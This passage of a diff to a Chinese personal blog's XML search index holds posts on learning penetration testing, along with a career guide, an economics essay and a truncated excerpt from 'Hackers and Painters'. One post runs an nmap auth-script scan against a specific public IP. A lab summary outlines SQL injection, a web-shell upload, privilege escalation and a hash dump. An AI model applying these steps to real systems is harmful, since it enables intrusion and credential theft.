src="http://upload-images.jianshu.io/upload_images/2883590-a5961a4233f6bd0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>\</p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>2018.2.10 发现开了22、80。</p><p> nmap --script=auth 23.234.25.222<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>training</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>training</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>用语法搜索网站目录</title>
+    <link href="/2016/12/01/%E7%94%A8%E8%AF%AD%E6%B3%95%E6%90%9C%E7%B4%A2%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95/"/>
+    <url>/2016/12/01/%E7%94%A8%E8%AF%AD%E6%B3%95%E6%90%9C%E7%B4%A2%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br>有本书叫做《Google hacking for penetration<br>testers》，这里有<a href="http://blog.csdn.net/cnasp/article/details/618686">博客写了读书笔记</a>。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-984b2f470a32540b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-7a866f0866106350.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-395cee35579a5f40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>training</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>training</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2016/11/14/netcraft%E6%9F%A5%E8%AF%A2%E7%BD%91%E7%AB%99/"/>
+    <url>/2016/11/14/netcraft%E6%9F%A5%E8%AF%A2%E7%BD%91%E7%AB%99/</url>
+    
+    <content type="html"><![CDATA[<hr><p>title: netcraft查询网站<br> {.show-content}<br>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-6aa4a2bb5a909f61.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>nameserver是给你的域名提供服务的服务商，它用于存放你的域名信息，它相当于网络上的空间服务商idc。</p><p>而dns服务器是给用户提供域名查询服务的，它的地位相当于网络上的宽带服务商。<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2016/11/14/whois%E5%91%BD%E4%BB%A4%E3%80%81nc%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E6%97%97%E6%A0%87/"/>
+    <url>/2016/11/14/whois%E5%91%BD%E4%BB%A4%E3%80%81nc%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E6%97%97%E6%A0%87/</url>
+    
+    <content type="html"><![CDATA[<hr><p>title: whois命令、nc获取服务旗标<br>t}<br>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-8230979aef3cb930.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>获得与ip相关的信息：地理位置精确到城市、所有的域名服务器（domain sever）</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-3ce62bc23c1d4464.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>LAMP架站 linux</title>
+    <link href="/2016/11/11/LAMP%E6%9E%B6%E7%AB%99/"/>
+    <url>/2016/11/11/LAMP%E6%9E%B6%E7%AB%99/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br>使用 linux，Apache、Mysql和PHP，俗称LAMP搭建www服务器。</p><p>先查看虚拟机是否已经安装了服务器呢？如果安装了，只要开启就行了。</p><blockquote><p>service apache2 restart</p></blockquote><p>没有安装的话，下载软件</p><blockquote><p>apt-get install apache2 apache2-doc</p><p>apt-get install mysql-server</p><p>apt-get install mysql-client</p><p>apt-get install php5</p><p>apt-get install libapache2-mod-php5</p><p>service apache2 restart</p></blockquote><p>好了，在网段内其他机器上输入</p><blockquote><p><a href="http://192.168.1.111/">http://192.168.1.111</a></p></blockquote><p>\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-da7f5d4c35c92f59.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>在/var/www/html<br>目录下，添加xxx.jpg等文件，通过浏览器<a href="http://192.168.1.111/xxx.jpg">http://192.168.1.111/xxx.jpg</a><br>即可访问<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>linux</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2016/11/05/%E5%AE%9E%E9%AA%8C%E5%90%A7%E2%80%94web%E9%A2%98%EF%BC%8C%E7%8C%AB%E6%8D%89%E8%80%81%E9%BC%A0/"/>
+    <url>/2016/11/05/%E5%AE%9E%E9%AA%8C%E5%90%A7%E2%80%94web%E9%A2%98%EF%BC%8C%E7%8C%AB%E6%8D%89%E8%80%81%E9%BC%A0/</url>
+    
+    <content type="html"><![CDATA[<hr><h2 id="title-实验吧—web题，猫捉老鼠"><a href="#title-实验吧—web题，猫捉老鼠" class="headerlink" title="title: 实验吧—web题，猫捉老鼠"></a>title: 实验吧—web题，猫捉老鼠</h2><p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br>老鼠是什么？http响应头\</p><p>考察的http协议。</p><p>我们要准备的工具是火狐浏览器,以及firebug插件。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-60108caaff0a508d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>我们可以看到content-row，在这里，有些朋友可能会说，为什么是这个呢？</p><p>如果你对http响应头熟悉，你会知道它大概会响应什么东西。</p><p>比方我们看两个例子。一个动漫网站响应头，一个购物网站响应头。我们会发现，在这里动漫网站响应的多一点。</p><p>它们有什么共同点呢？</p><p>连接活跃，连接日期，响应的内容长度，内容的类型，服务器类型，缓存机制，大概就是那么些东西。所以content-row很可疑。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-05c56d1b3af6240d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-44202336e2104b88.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>既然捉到老鼠，那就提交吧</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-d19d43be131510b8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>网站综合渗透实验</title>
+    <link href="/2016/11/04/%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C-%E7%A4%BE%E5%B7%A5/"/>
+    <url>/2016/11/04/%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C-%E7%A4%BE%E5%B7%A5/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br>writeup：<a href="http://www.jianshu.com/p/853799779d45/">http://www.jianshu.com/p/853799779d45\</a></p><p>说是社工，就是搜集站长泄露的个人信息，构造一个字典，自动化暴力破解。技术含量不高，但对于某些大意的人来说还是有点好用。</p><p>一，明小子sql注入，拿到网站用户名密码</p><p>二，上传图片马，图片备份导致木马被解析，菜刀连接备份的地址。</p><p>三，上传提权工具，得到服务器hash值</p><p>四，数据库sa密码在某个网页，找到就好。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-c08d331d4c75dc1a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-ab3e5829a477d82a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-3abc660f16811df7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-7368bf7a011cf080.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>如何成为一个渗透测试员</title>
+    <link href="/2016/11/03/%E5%A6%82%E4%BD%95%E6%88%90%E4%B8%BA%E4%B8%80%E4%B8%AA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%91%98/"/>
+    <url>/2016/11/03/%E5%A6%82%E4%BD%95%E6%88%90%E4%B8%BA%E4%B8%80%E4%B8%AA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%91%98/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br>原版：<a href="http://www.cyberdegrees.org/jobs/penetration-tester/">http://www.cyberdegrees.org/jobs/penetration-tester/</a></p><p><strong>短版本：</strong></p><p>一个渗透测试人员探测  基于web的应用、网络、系统 的安全漏洞。</p><p>用另一种话说，就是你被付薪水来做合法hack。在这个很酷的工作，你将会使用一系列的渗透测试工具一些是预先决定的，一些事你自己设计的，来模拟真实生活中的网络攻击。你的最终目标就是帮助组织证明他们的安全性。</p><p>**<br>**</p><p><strong>渗透测试者的责任：</strong></p><p>合法的hacking是性感和无聊的部分的混合。不像真实世界的黑客，你可能只有几天的时间来侵入一个系统。</p><p>甚至，你被期望说明和解释你的方法和你的发现。渗透测试被称作信息安全领域最令人沮丧的工作之一。</p><p>总体来说，你可能被要求：</p><p>执行一个常规渗透测试 给基于web的程序 网络以及计算机系统。</p><p>给服务器 系统 网络设置 进行一个物理性安全评估</p><p>设计和创建一个新的渗透测试工具</p><p>探测  web应用，客户端应用和标准协议 的漏洞</p><p>指出攻击者可能 使用的方法来利用弱点和缺陷</p><p>利用社会工程来揭露系统漏洞（脆弱的用户安全操作或密码策略 ）</p><p>与之合作的公司的考虑（比如因停机而遭受的损失）</p><p>与管理者、IT队伍研究、说明、议论安全发现</p><p>检查和定义 信息安全措施 的要求。</p><p>致力于提高安全服务，包括持续的提高现有的方法来支持评估</p><p>提供回馈和评估 为一个组织解决安全问题</p><p>~在一个渗透测试里，你将会集中于利用漏洞（作为目标进入系统）。</p><p>一个渗透测试团队会对开放的系统进行拍照，来表示他们能够进入数据库，而不是像罪犯那样实际的去做。</p><p>\</p><p><strong>渗透测试者的职业路径：</strong></p><p>测试者来自各种领域角度。一些在大学开始hacking，其他的使用他们的计算机学位专注于网络安全。</p><p>不管你是什么路线，雇佣者不会想要雇佣你仅仅取决于学校，你可以考虑获取以下IT工作的经验例如</p><p>安全管理员</p><p>网络管理员</p><p>系统管理员</p><p>网络工程师</p><p>当你证明你有渗透测试者的能力的时候，你可以选择更好的待遇，例如：</p><p>初级渗透测试员</p><p>安全专家</p><p>安全架构师</p><p>**相似的工作:**渗透测试也被称为, 合法的黑客，安全审计员。</p><p><strong>渗透测试者的薪水：</strong>根据薪级表，渗透测试者的中位数是71929美元（2014年的数据），总的来说，你可以期望拿回家<br>44220 - 117389<br>美元。这包括你你基本的年度薪水，奖金，收益分红，佣金，加班费和其他的现金收入。**<br>**</p><p><strong>渗透测试工作的要求:</strong></p><p>学位要求：大多数渗透测试者没有持有特定的学位。因为合法的黑客更要求技能而不是课程评分，一个本科或者研究生学位不是必须的，如果你有了合适的工作经验。</p><p>尽可能的磨练你的技巧。去看看hacking文献，研究潜在的证明，学习SANS课程，开始一个渗透测试实验，向其他渗透测试人员学习，阅读更多更多。</p><p><strong>工作经验：</strong></p><p>总体上，雇佣者倾向寻找2-4年安全相关的经验，在渗透测试和漏洞评估方面。高级渗透测试者的范围变化更大，</p><p>可能是低于3年或者7到10年的经验。</p><p><strong>硬技能</strong>：</p><p>Windows, UNIX and Linux 操作系统经验</p><p>C, C++, C#, Java, ASM, PHP, PERL</p><p>网络服务器和网络工具(e.g. Nessus, nmap, Burp, etc.)</p><p>计算机硬件和软件系统</p><p>基于web 的应用</p><p>安全框架(e.g. ISO 27001/27002, NIST, HIPPA, SOX, etc.)</p><p>安全工具和产品 (Fortify, AppScan, etc.)</p><p>漏洞分析和逆向工程Vulnerability analysis and reverse engineering</p><p>Metasploit框架</p><p>取证工具</p><p>密码学原理</p><p><strong>软技能：</strong></p><p>书写的你简历，开始列出一些软技能：创造性，解决问题的能力和分析思考。向他们展示你的高的道德素质，展示你的”走出困境”的方法。展示你对于细节严谨的态度。</p><p>口头表达能力和交流技巧是另外两个大方面，</p><p>另外除了大量的文书工作（写作报告和评估），你可能会感到惊讶，你要经常与人交谈。</p><p>你的一天将涉及技术和非技术观众解释你的方法。你也可以协调社会工程的举措。</p><p><strong>渗透测试者的证书：懒得翻译了，都是国外的证书，国内的。。？</strong></p><p>**CEH: Certified Ethical Hacker<br>**</p><p>CPT: Certified Penetration Tester</p><p>CEPT: Certified Expert Penetration Tester</p><p>GPEN: GIAC Certified Penetration Tester</p><p>OSCP: Offensive Security Certified Professional</p><p>CISSP: Certified Information Systems Security Professional</p><p>GCIH: GIAC Certified Incident Handler</p><p>GCFE: GIAC Certified Forensic Examiner</p><p>GCFA: GIAC Certified Forensic Analyst</p><p>CCFE: Certified Computer Forensics Examiner</p><p>CREA: Certified Reverse Engineering Analyst<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>经济危机的逻辑
+- View</title>
+    <link href="/2016/09/23/%E7%BB%8F%E6%B5%8E%E5%8D%B1%E6%9C%BA%E7%9A%84%E9%80%BB%E8%BE%91/"/>
+    <url>/2016/09/23/%E7%BB%8F%E6%B5%8E%E5%8D%B1%E6%9C%BA%E7%9A%84%E9%80%BB%E8%BE%91/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br>以前初中的时候学政治还有历史，没有搞懂什么是经济危机。\</p><h2 id="书上只描绘了一副破败的景象"><a href="#书上只描绘了一副破败的景象" class="headerlink" title="书上只描绘了一副破败的景象"></a>书上只描绘了一副破败的景象</h2><hr><hr><hr><p>工厂倒闭、企业主破产、公司裁员，还有一个大叔在脖子上挂一个牌子，说’精通5国语言，求一份工作’。</p><p>大公司把牛杀掉，埋了，把牛奶倒在河里。</p><p>我真的搞不懂，既然卖不掉为什么不把东西送给穷人，不是送钱都要做慈善吗？然后老师开始给我们划重点，要考的内容。。。</p><p>难道人类社会已经进化到吃一碗倒一碗的富裕程度了吗？但是我们历史老师只会叫我们背，时间地点起因经过结果三大总结五大基本规律什么鬼？</p><p>然后考试考试考试，想想真是深痛恶绝。咳，扯远了。</p><p>资本社会的规律是这样的。假设我开了一个火锅店，爆满。为了增加收入，我就再开几家分店，还是供不应求，赚够利润了以后，怎么办？</p><p>对了，再开分店。</p><h2 id="火锅店老板：赚了"><a href="#火锅店老板：赚了" class="headerlink" title="火锅店老板：赚了 "></a>火锅店老板：赚了 </h2><hr><h2 id="》-开分店"><a href="#》-开分店" class="headerlink" title="》 开分店 "></a>》 开分店 </h2><hr><h2 id="》-赚了"><a href="#》-赚了" class="headerlink" title="》 赚了 "></a>》 赚了 </h2><hr><p>》开分店</p><hr><hr><h2 id="》赚了"><a href="#》赚了" class="headerlink" title="》赚了 "></a>》赚了 </h2><hr><h2 id="》开分店"><a href="#》开分店" class="headerlink" title="》开分店 "></a>》开分店 </h2><hr><h2 id="》亏损"><a href="#》亏损" class="headerlink" title="》亏损 "></a>》亏损 </h2><hr><p>》关店+裁员</p><h2 id="火锅店店员：被裁了"><a href="#火锅店店员：被裁了" class="headerlink" title="火锅店店员：被裁了"></a>火锅店店员：被裁了</h2><hr><p>》缩衣节食</p><p>在任何社会，工人多，资本家少，大抵如此。</p><p>工人都被裁了，没有工资，不可能去借钱消费。</p><p>没有人消费，生产的过剩产品只能够销毁。</p><p>那些倒到河里的牛奶可不可以送给穷人？可以。但是假设有100人需要牛奶，你把牛奶送给穷人，结果只有20人买了牛奶。没错，这是降低自己利润的行为。</p><p>但是需求是不可能无限增长的，有一个临界点，后来大家发现内需不足了，然后就经济危机了。</p><p>这很正常，就像月圆月缺、潮起潮落。</p><p>为什么会内需不足？因为资本家赚钱，工人赚血汗钱。你替老板赚了5000，你只能拿2000工资，哦不，还有一半要交给国家，所以你只能拿1000所以到后来，资本家越来越有钱，工人没钱（社会财富集中在少数人手里）。资本家要赚工人的钱，但是已经没钱给他们赚了。</p><p>工人已经被剥削殆尽了。</p><h2 id="这就是内需不足"><a href="#这就是内需不足" class="headerlink" title="这就是内需不足"></a>这就是内需不足</h2><hr><p>经济危机的逻辑。<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>我的技能树</title>
+    <link href="/2016/09/14/%E6%88%91%E7%9A%84%E6%8A%80%E8%83%BD%E6%A0%91/"/>
+    <url>/2016/09/14/%E6%88%91%E7%9A%84%E6%8A%80%E8%83%BD%E6%A0%91/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br>大学过去了一年，一年里懵懂的从未成年人跨入了一个新世界。</p><p>我发现了一个感兴趣的工作，希望通过它在未来可以让自己达到经济独立，不依靠父母，并最终依靠持续的学习和思考达到财务自由的境界。</p><p>现在将渗透测试师技能要求列出来。</p><p><strong>1.至少精通一种脚本语言，python，php等。可以自己编写出攻击和检测程序(ing)</strong></p><p>1.1学习javascript。（2016年上半年）参考书目</p><p>《javascript Web开发技术》川大教科书、《javascript DOM编程艺术》、</p><p>《XSS跨站脚本攻击剖析与防御》《白帽子学习web安全》</p><p>1.2学习php。（2016年下半年）</p><p>《php6 与mysql5基础教程》</p><p>1.3学习python，（2017年上半年）</p><p>《从python开始学编程》《python核心编程》</p><p><strong>2.熟悉WEB领域常用标准和协议。</strong></p><p>《TCP/IP协议》</p><p><strong>3.熟悉常见的渗透测试技术和工具。</strong>sniffer pro、NMAP 、NC、 reDuh<br>、Hijack 、LCX</p><p>《网站渗透测试实战入门》陈照明</p><p>《渗透测试实践指南：必知必会的工具与方法》</p><p><strong>4.有Unix,Windows系统知识经验，</strong>如：MSSQL,ORACLE,EXCHANGE</p><p>***5.熟悉汇编反汇编脱壳、Hook和加密解密技术，熟悉SHEELCOODE编写技术。\</p><hr><p><em><strong>6.掌握一类开发语言，c，java，perl,lisp(更好的经验和启迪）</strong></em></p><p><em><strong>7.拥有四年工作经验后，考cissp证书。</strong></em></p><p><strong>熟悉的要求：闭着眼能想起原理和实现</strong></p><p><strong>精通：观点一针见血，实现一挥而就</strong><br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>View</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>View</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>读后感·黑客与画家 View</title>
+    <link href="/2016/05/12/%E8%AF%BB%E5%90%8E%E6%84%9F%C2%B7%E9%BB%91%E5%AE%A2%E4%B8%8E%E7%94%BB%E5%AE%B6/"/>
+    <url>/2016/05/12/%E8%AF%BB%E5%90%8E%E6%84%9F%C2%B7%E9%BB%91%E5%AE%A2%E4%B8%8E%E7%94%BB%E5%AE%B6/</url>
+    
+    <content type="html"><![CDATA[<p>读后感·黑客与画家（本文摘自同名书籍）<br>读完计算机系的研究生，我就去了艺术学校，学习绘画。许多人很吃惊：一个喜欢计算机的人，居然还喜欢画画！他们似乎觉得，摆弄计算机和画画是两件截然不同的事情</p><hr><hr><p>计算机是冰冷的、精确的、井然有序的，而画画是某种原始欲望热烈狂放的表达方式。<br>　　这种看法是错的。计算机和画画有许多共同之处。事实上，在我知道的所有行业中，黑客与画家最相像。<br>　黑客与画家的共同之处，在于他们都是创作者。与作曲家、建筑师、作家一样，黑客和画家都是试图创作出优秀的作品。他们本质上都不是在做研究，虽然在创作过程中，他们可能会发现一些新技术（那样当然更好）。<br>　　我一直不喜欢”计算机科学”（computer<br>science）这个词。主要原因是根本不存在这种东西。计算机科学就像一个大杂烩，由于某些历史意外，很多不相干的领域被强行拼装在一起。这个学科的一端是纯粹的数学家，他们自称”计算机科学家”，只是为了得到国防部研究局（DARPA）的项目资助。中间部分是计算机博物学家，研究各种专门性的题目，比如网络数据的路由算法。另一端则是黑客，只想写出有趣的软件，对于他们来说，计算机只是一种表达的媒介，就像建筑师手里的混凝土，或者画家手里的颜料。所以，在”计算机科学”的名下，数学家、物理学家、建筑师都不得不待在同一个系里。<br>有时，黑客做的事情被称为”软件工程”（software<br>engineering），但是这个词也是误导的。与其说优秀的软件设计师是工程师，还不如说是建筑师。建筑学和工程学之间的区别并不是很严格的，但就是存在区别。这表现在”做什么”和”怎么做”：建筑师决定做什么，工程师想出怎么做。<br>^「在英语中，”建筑师”（architect）和”架构师”（architect）是同一个词，所以这里用的是双关语，意思是优秀程序员不仅负责建造，还负责架构。后一句中的”建筑学”（architecture）也是这种双关用法，同时指”架构学”（architecture）。一译者注」<br>　　当然，”做什么”和”怎么做”不应该分得太开。如果你决定做一件事，却不知道怎么做，你就是在自找麻烦。但是，只是单纯地决定如何实现某种规格，那肯定不是黑客。黑客的最髙境界是创造规格。虽然看起来，做到这一点的最好方法就是先做出一个样品把规格实现了。<br>　　也许有一天，”计算机科学”分裂成几个独立的部分。这可能是一件好事，如果我本人的领域</p><hr><hr><h2 id="黑客"><a href="#黑客" class="headerlink" title="黑客"></a>黑客</h2><hr><p>能够独立出来，那就更好了。<br>　　把不同类型的工作捆绑在一起，可能是为了行政管理的方便，但是却容易引起混淆。这是我不喜欢”计算机科学”这个词的又一个原因。中间部分”计算机科学家”的工作，也许还可以被称为计算机的实验科学。但是，两端的数学家和黑客，并不是在做计算机的科学研究。<br>　　数学家看来并不在乎自己搞的是计算机还是数学。他们很高兴来到这个新地方，然后就开始埋头证明新的定理，与数学系的数学家干的事情完全一样。不一会儿，他们可能就忘了办公楼外的牌子上写的是”计算机科学系”。<br>但是对于黑客，”计算机科学”这个标签是一个麻烦。如果黑客的工作被称为科学，这会让他们感到自己应该做得像搞科学一样。所以，大学和实验室里的黑客，就不去做那些真正想做的事情（设计优美的软件），而是觉得自己应该写一些研究性的论文。<br>　　要是黑客写论文，最好的情况下，写出来的也只是一些补充性的描述，不会具有太大的实际价值。黑客先开发了一个很酷的软件，然后就写一篇论文，介绍这个软件。论文变成了软件成果的展示。这种结合是错误的，常常会产生问题。为了配合论文研究性的主题，你很容易就把工作重点从开发优美的软件转移为开发一些丑陋的东西。<br>　　优美的软件并不总是论文的合适题材。首先，科学研究必须具有原创性。写过博士论文的人都知道，确保自己正在开垦新领地的方法，就是去找那些没有人要的土地。其次，科学研究必须是能够产生大量成果的，而那些不成熟的、障碍重重的领域最容易写出许多篇论文，因为你可以写那些为了完成工作、你不得不克服的障碍。没有什么比一个错误的前提更容易产生大量待解决的问题了。人工智能（AI）领域的大部分情况，都符合这条”如何凭空创造出问题”的规律。如果你假定，使用一系列的谓词逻辑（predicate<br>logic）表达式，再加上代表抽象概念的参数，就能表达人类的知识，那么，你就可以写出许许多多的论文，解释如何完成这项工作。这就像电视剧《我爱露西》（I<br>Love Lucy）的男主角Ricky Ricardo的话：”露西，这下够你好好解释的了。”<br>　　创造优美事物的方式往往不是从头做起，而是在现有成果的基础上做一些小小的调整，或者将已有的观点用比较新的方式组合起来。这种类型的工作很难用研究性的论文表达。<br>　　那么，为什么大学和实验室还把论文数量作为考核黑客工作的指标呢？这种事情其实在日常生活中普遍存在，比如，我们使用简单的标准化测试考核学生的”学术能力倾向”（scholastic<br>aptitude），再比如，我们使用代码的行数考核程序员的工作效率。这样的考核容易实施，而容易实施的考核总是首先被采用。<br>　　黑客真正想做的是设计优美的软件，考核这种工作是非常困难的。你本人需要有良好的设计感，才能去考核别人的设计是否良好。但是，你觉得你有”良好的设计感”，与你实际是否具有，不存在相关关系，甚至可能存在负相关。<br>　　唯一有效的外部考核就是时间。经过岁月的洗礼，优美的东西生存发展的机会更大，丑陋的东西往往会被淘汰。不幸的是，这种考核需要的时间可能比一个<br>人的生命还要长。塞缪尔·约翰逊^说过，人们对一个作家的评价，需要100年才能达成一致^^。你必须先等他的那些有影响力的朋友都死了，然后再等他的追随者都死了，才能对他有一个公正的评价。<br>塞缪尔·约翰逊（Samuel<br>Johnson，1709-1784），英国词典学家，编撰了历史上第一本广泛使用、影响巨大的英文字典。</p><hr><hr><p>译者注」<br>「塞缪尔·约翰逊在他编辑的《莎士比亚戏剧集》的前言中写道：”他（莎士比亚）的影响远远超过他的时代，时间就是对他文学成就的检验。不管他的作品从那时的暗语、风俗、政治局势之中，得到过怎样的优势，这些优势都已经消逝多年了。他在毎一幕戏剧中，通过模拟那时的生活所产生的每一个欢乐的主题或悲伤的动机，都已经趋于平淡，而不再是戏剧的亮点。贵族的宠爱和对手的竞争，都不再产生效果，朋友和敌人都走进了坟墓，他的作品再也不是支持一方、打击另一方的舆论工具；它们既不能产生虚名，也不会带来恶意的攻击。人们阅读这些作品，只有一个理由，那就是欣赏作品本身。因此，只有人们真正欣赏它们，才会发出赞美……”」<br>　　我想，名望有很大的随机性，黑客对此只好听天由命了。在这一点上，他们与其他创作者并无不同。事实上，相比而言，他们还是幸运的。暂时性的、一窝蜂式的时代风潮对画家的影响要比对黑客的影响大得多。<br>　　人们无法考核你的工作，甚至误解你的工作，都不是最糟的事。更大的危险是你自己也会误解自己的工作。因为你总是从相关领域寻找新思想，如果你发现自己读的是计算机科学系，很自然地，你就会以为”计算机科学”与其他”理论科学”并无不同，你的工作属于”理论计算机科学”所涉及的那种理论的应用研究。读研究生期间，我潜意识里一直有一种很不舒服的感觉，觉得自己应该多学一点理论，不应该期末考试结束还不到三个星期，就把所有东西忘得一干二净，那样真是不可饶恕。现在，我意识到自己错了。黑客搞懂”计算理论”（theory<br>of<br>computation）的必要性，与画家搞懂颜料化学成分的必要性差不多大。一般来说，在理论上，你需要知道如何计算”时间复杂度”和”空间复杂度”（time<br>and space<br>complexity）；如果你要写一个解析器，可能还需要知道状态机（state<br>machine）的概念；除此以外，并不需要知道特别多的理论。这些可比画家必须记住的颜料成分少很多。<br>　　我发现，黑客新想法的最佳来源，并非那些名字里有”计算机”三个字的理论领域，而是来自于其他创作领域。与其到”计算理论”领域寻找创意，你还不如在绘画中寻找创意。<br>　　举例来说，我在大学受到的教育是，在上机编程之前，应该先在纸上把程序搞清楚。可我自己一直不是这样编程的，我喜欢直接坐在计算机前编程，而不是在纸上编程。更糟的是，我不是耐心地一步步写出整个程序，确保大体上是正确的，而是一股脑不管对错，先把代码堆上去，再慢慢修改。书上说，调试（debugging）是最后的步骤，用来纠正打字的错误和疏忽。可是我的工作方法看上去却像编程就是在调试。<br>　　很长一段时间内我都为此事沮丧，就像小学里老师教我怎么拿铅笔，我却总是学不会的那种感觉。如果我那时看到其他创作领域，比如绘画或者建筑，我就会想到，自己的方法其实有一个正式的名称：打草稿。我现在认为，大学里教给我的编程方法都是错的。你把整个程序想清楚的时间点，应该是在编写代码的同时，而不是在编写代码之前，这与作家、画家和建筑师的做法完全一样。<br>　　